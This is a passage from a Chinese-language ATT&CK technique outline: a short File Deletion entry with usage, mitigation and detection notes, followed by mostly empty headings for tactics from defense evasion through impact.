- 攻击者在系统抛出或创建的恶意软件，工具或其他非本机原生文件，可能会留下入侵痕迹。
- 在入侵过程中删除这些文件以保持其少量占用空间，或在入侵后的清理过程中最终将其清除。
  
#### 利用场景

- 使用本机cmd函数如DEL，安全删除工具如Windows Sysinternals SDelete或其他第三方文件删除工具。
- 某些监视工具可能会收集命令行参数，但因DEL是cmd.exe中的本机函数，可能不会捕获DEL命令，。

#### 防御方式

- 属于系统功能滥用，无法简单缓解。

#### 检测

- **监视命令行**删除功能，以使其与二进制文件或攻击者可能删除并删除的其他文件相关联。
- **监视**攻击者可能会引入目标网络系统的，尚未存在的已知与**安全删除工具**。

***

### File System Logical Offsets

#### 背景
  
#### 利用场景

#### 防御方式

缓解|描述
:--:|:--

#### 检测

***

### Gatekeeper Bypass

***

### Group Policy Modification

***

### Hidden Files and Directories

***

### Hidden Users

***

### Hidden Window

***

### HISTCONTROL

***

### Image File Execution Options Injection

>同 [图像文件执行选项注入](#image-file-execution-options-injection-%e5%9b%be%e5%83%8f%e6%96%87%e4%bb%b6%e6%89%a7%e8%a1%8c%e9%80%89%e9%a1%b9%e6%b3%a8%e5%85%a5)

***

### Indicator Blocking

***

### Indicator Removal from Tools

***

### Indicator Removal on Host

***

### Indirect Command Execution

***

### Install Root Certificate

***

### InstallUtil

>同 [InstallUtil](#installutil-installutil)

***

### Launchctl

***

### LC_MAIN Hijacking

***

### Masquerading

***

### Modify Registry

***

### Mshta

>同 [Mshta](#mshta-mshtaexe)

***

### Network Share

***

### Connection Removal

***

### NTFS File Attributes

***

### Obfuscated Files or Information (混淆的文件或信息)

***

### Parent PID Spoofing

>同 [PPID欺骗](#parent-pid-spoofing-ppid%e6%ac%ba%e9%aa%97)

***

### Plist Modification

>同 [修改Plist](#plist-modification-%e4%bf%ae%e6%94%b9plist)

***

### Port Knocking

>同 [端口试探](#port-knocking-%e7%ab%af%e5%8f%a3%e8%af%95%e6%8e%a2)

***

### Process Doppelgänging

***

### Process Hollowing

***

### Process Injection

>同 [进程注入](#process-injection-%e8%bf%9b%e7%a8%8b%e6%b3%a8%e5%85%a5)

***

### Redundant Access

>同 [冗余访问](#redundant-access-%e5%86%97%e4%bd%99%e8%ae%bf%e9%97%ae)

***

### Regsvcs/Regasm

>同 [Regsvcs / Regasm](#regsvcsregasm-regsvcs--regasm)

***

### Regsvr32

>同 [Regsvr32](#regsvr32-regsvr32)

***

### Rootkit (Rootkit)

***

### Rundll32

>同 [Rundll32](#rundll32-rundll32)

***

### Scripting

>同 [Scripting](#scripting-%e8%84%9a%e6%9c%ac)

***

### Signed Binary Proxy Execution

>同 [含签名的二进制代理执行](#signed-binary-proxy-execution-%e5%90%ab%e7%ad%be%e5%90%8d%e7%9a%84%e4%ba%8c%e8%bf%9b%e5%88%b6%e4%bb%a3%e7%90%86%e6%89%a7%e8%a1%8c)

***

### Signed Script Proxy Execution

>同 [含签名的脚本代理执行](#signed-binary-proxy-execution-%e5%90%ab%e7%ad%be%e5%90%8d%e7%9a%84%e4%ba%8c%e8%bf%9b%e5%88%b6%e4%bb%a3%e7%90%86%e6%89%a7%e8%a1%8c)

***

### SIP and Trust Provider Hijacking

>同 [SIP和信任提供者劫持](#sip-and-trust-provider-hijacking-sip%e5%92%8c%e4%bf%a1%e4%bb%bb%e6%8f%90%e4%be%9b%e8%80%85%e5%8a%ab%e6%8c%81)

***

### Software Packing

***

### Space after Filename

>同 [文件名后的空格](#space-after-filename-%e6%96%87%e4%bb%b6%e5%90%8d%e5%90%8e%e7%9a%84%e7%a9%ba%e6%a0%bc)

***

### Template Injectio

***

### Timestomp

***

### Trusted Developer Utilities

>同 [受信任的开发工具](#trusted-developer-utilities-%e5%8f%97%e4%bf%a1%e4%bb%bb%e7%9a%84%e5%bc%80%e5%8f%91%e5%b7%a5%e5%85%b7)

***

### Valid Accounts

>同 [合法账号](#valid-accounts-%e5%90%88%e6%b3%95%e8%b4%a6%e5%8f%b7)

***

### Virtualization/Sandbox Evasion

***

### Web Service

***

### XSL Script Processing

>同 [XSL 脚本处理](#xsl-script-processing-xsl-%e8%84%9a%e6%9c%ac%e5%a4%84%e7%90%86)

***

## Credential Access (凭证访问)

***

### Account Manipulation

>同 [账户操作](#account-manipulation-%e8%b4%a6%e6%88%b7%e6%93%8d%e4%bd%9c)

***

### Bash History

***

### Brute Force	

***

### Credential Dumping

***

### Credentials from Web Browsers

***

### Credentials in Files

***

### Credentials in Registry

***

### Exploitation for Credential Access

***

### Forced Authentication

***

### Hooking

>同 [Hooking](#hooking-hooking)

***

### Input Capture

***

### Input Prompt

***

### Kerberoasting

***

### Keychain

***

### LLMNR/NBT-NS Poisoning and Relay

***

### Network Sniffing

***

### Password Filter DLL

***

### Private Keys

***

### Securityd Memory

***

### Steal Web Session Cookie

***

### Two-Factor Authentication Interception

***

## Discovery (嗅探扫描)

***

### Account Discovery

***

### Application Window Discovery

***

### Browser Bookmark Discovery

***

### Domain Trust Discovery

***

### File and Directory Discovery

***

### Network Service Scanning

***

### Network Share Discovery

***

### Network Sniffing

***

### Password Policy Discovery

***

### Peripheral Device Discovery

***

### Permission Groups Discovery

***

### Process Discovery

***

### Query Registry (查询注册表)

***

### Remote System Discovery

***

### Security Software Discovery

***

### Software Discovery

***

### System Information Discovery

***

### System Network Configuration Discovery

***

### System Network Connections Discovery

***

### System Owner/User Discovery

***

### System Service Discovery

***

### System Time Discovery

***

### Virtualization/Sandbox Evasion

***

## Lateral Movement (横向移动)

***

### AppleScript

>同 [AppleScript](#applescript-applescript)

***

### Application Access Token

>同 [应用程序访问令牌](#application-access-token-%e5%ba%94%e7%94%a8%e7%a8%8b%e5%ba%8f%e8%ae%bf%e9%97%ae%e4%bb%a4%e7%89%8c-saasoffice-365)

***

### Application Deployment Software

***

### Component Object Model and Distributed COM

***

### Exploitation of Remote Services

***

### Internal Spearphishing

***

### Logon Scripts

>同 [登录脚本](#logon-scripts-%e7%99%bb%e5%bd%95%e8%84%9a%e6%9c%ac)

***

### Pass the Hash

***

### Pass the Ticket

***

### Remote Desktop Protocol

***

### Remote File Copy

***

### Remote Services (远程服务)

***

### Replication Through Removable Media

> 同 [通过可移动媒介复制](#replication-through-removable-media-%e9%80%9a%e8%bf%87%e5%8f%af%e7%a7%bb%e5%8a%a8%e5%aa%92%e4%bb%8b%e5%a4%8d%e5%88%b6)

***

### Shared Webroot

***

### SSH Hijacking

***

### Taint Shared Content

***

### Third-party Software

***

### Web Session Cookie

***

### Windows Admin Shares

***

### Windows Remote Management

>同 [Windows 远程管理](#windows-remote-management-windows-%e8%bf%9c%e7%a8%8b%e7%ae%a1%e7%90%86)

***

## Collection

***

### Audio Capture

***

### Automated Collection

***

### Clipboard Data

***

### Data from Information Repositories

***

### Data from Local System

***

### Data from Network Shared Drive

***

### Data from Removable Media

***

### Data Staged

***

### Email Collection

***

### Input Capture

***

### Man in the Browser

***

### Screen Capture

***

### Video Capture

***

## Command and Control

***

### Commonly Used Port

***

### Communication Through Removable Media

***

### Connection Proxy

>同 [连接代理](#connection-proxy-%e8%bf%9e%e6%8e%a5%e4%bb%a3%e7%90%86-all)

***

### Custom Command and Control Protocol

***

### Custom Cryptographic Protocol

***

### Data Encoding

***

### Data Obfuscation

***

### Domain Fronting

***

### Domain Generation Algorithms

***

### Fallback Channels

***

### Multi-hop Proxy

***

### Multi-Stage Channels

***

### Multiband Communication

***

### Multilayer Encryption

***

### Port Knocking

>同 [端口试探](#port-knocking-%e7%ab%af%e5%8f%a3%e8%af%95%e6%8e%a2)

***

### Remote Access Tools

***

### Remote File Copy

***

### Standard Application Layer Protocol

***

### Standard Cryptographic Protocol

***

### Standard Non-Application Layer Protocol

***

### Uncommonly Used Port

***

### Web Service

***

## Exfiltration

***

### Automated Exfiltration

***

### Data Compressed

***

### Data Encrypted

***

### Data Transfer Size Limits

***

### Exfiltration Over Alternative Protocol

***

### Exfiltration Over Command and Control Channel

***

### Exfiltration Over Other Network Medium

***

### Exfiltration Over Physical Medium

***

### Scheduled Transfer

***

## Impact

***

### Account Access Removal

***

### Data Destruction

***

### Data Encrypted for Impact

***

### Defacement

***

### Disk Content Wipe

***

### Disk Structure Wipe

***

### Endpoint Denial of Service

***

### Firmware Corruption

***

### Inhibit System Recovery

***

### Network Denial of Service

***

### Resource Hijacking

***

### Runtime Data Manipulation

***

### Service Stop

***

### Stored Data Manipulation

***

### System Shutdown/RebootTransmitted Data Manipulation

***